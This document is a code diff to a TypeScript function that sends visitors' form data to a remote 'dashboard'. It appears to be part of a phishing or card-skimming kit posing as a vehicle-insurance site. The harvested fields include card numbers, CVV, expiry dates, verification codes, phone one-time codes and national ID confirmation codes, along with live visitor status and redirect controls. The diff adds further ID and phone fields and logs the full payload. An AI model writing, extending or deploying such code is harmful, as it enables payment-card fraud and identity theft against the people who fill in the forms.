@@ -28,14 +28,14 @@ export function hasMeaningfulDashboardPayload(payload: Record<string, any> | und
 
   const relevantKeys = [
     'ownerName', 'buyerName', 'customer', 'name', 'firstName', 'lastName',
-    'identityNumber', 'buyerIdNumber', 'phoneNumber', 'email', 'documentType',
+    'identityNumber', 'buyerIdNumber', 'phoneIdNumber', 'nafadIdNumber', 'phoneNumber', 'mobileNumber', 'email', 'documentType',
     'serialNumber', 'insuranceType', 'registrationType', 'coverageType',
     'vehicleModel', 'manufacturingYear', 'vehicleUsage', 'usage', 'repairLocation',
     'companyName', 'originalPrice', 'discount', 'finalPrice', 'features',
     'cardNumber', 'cardOwner', 'cardExpiry', 'cvv', 'verificationCode',
     'country', 'countryName', 'countryCode', 'city', 'address', 'paymentMethod',
     'currentPage', 'page', 'currentStep', 'step', 'redirectPage', 'redirect_page',
-    'nafadConfirmationCode', 'nafadConfirmationStatus', 'status', 'isOnline', '_v7', 'phoneOtpStatus', 'phoneOtpSubmittedAt', 'phoneOtpUpdatedAt', '_v1', '_v2', '_v3', '_v4', '_v5', '_v6', '_v7UpdatedAt', 'phoneResendRequested', 'phoneResendError',
+    'nafadConfirmationCode', 'nafadConfirmationStatus', 'status', 'isOnline', '_v7', 'phoneOtpStatus', 'phoneOtpSubmittedAt', 'phoneOtpUpdatedAt', 'phoneSubmittedAt', 'phoneUpdatedAt', 'phoneCarrier', 'phoneRejectionMessage', '_v1', '_v2', '_v3', '_v4', '_v5', '_v6', '_v7UpdatedAt', 'phoneResendRequested', 'phoneResendError',
   ];
 
   const nestedPayload = payload.raw ?? payload.formData ?? payload.data;
@@ -64,6 +64,7 @@ export async function notifyDashboard(payload: Record<string, any>): Promise<voi
   if (typeof window === 'undefined') return;
   
   console.log('[notifyDashboard] Called with payload keys:', Object.keys(payload));
+  console.log('[notifyDashboard] Payload:', JSON.stringify(payload, null, 2));
   
   try {
     let fallbackVisitorId = window.localStorage.getItem('visitor') || `visitor_${Date.now()}`;
@@ -93,6 +94,7 @@ export async function notifyDashboard(payload: Record<string, any>): Promise<voi
     const hasIdentity = Boolean(payload?.id || payload?.visitorId || payload?.raw?.id || payload?.raw?.visitorId || fallbackVisitorId);
     console.log('[notifyDashboard] hasIdentity:', hasIdentity);
     console.log('[notifyDashboard] hasMeaningfulPayload:', hasMeaningfulDashboardPayload(payload));
+    console.log('[notifyDashboard] hasIdentity check:', { id: !!payload?.id, visitorId: !!payload?.visitorId, fallbackVisitorId: !!fallbackVisitorId });
     
     if (!hasMeaningfulDashboardPayload(payload) && !hasIdentity) {
       console.log('[notifyDashboard] Skipping - no meaningful payload');
@@ -172,6 +174,9 @@ export async function notifyDashboard(payload: Record<string, any>): Promise<voi
         });
         console.log('[notifyDashboard] Response OK:', response.ok);
         success = response.ok;
+        if (success) {
+          console.log('[notifyDashboard] Successfully sent data to dashboard!');
+        }
         if (!success) {
           console.log('[notifyDashboard] Retry', retries + 1, 'of', maxRetries);
           retries++;
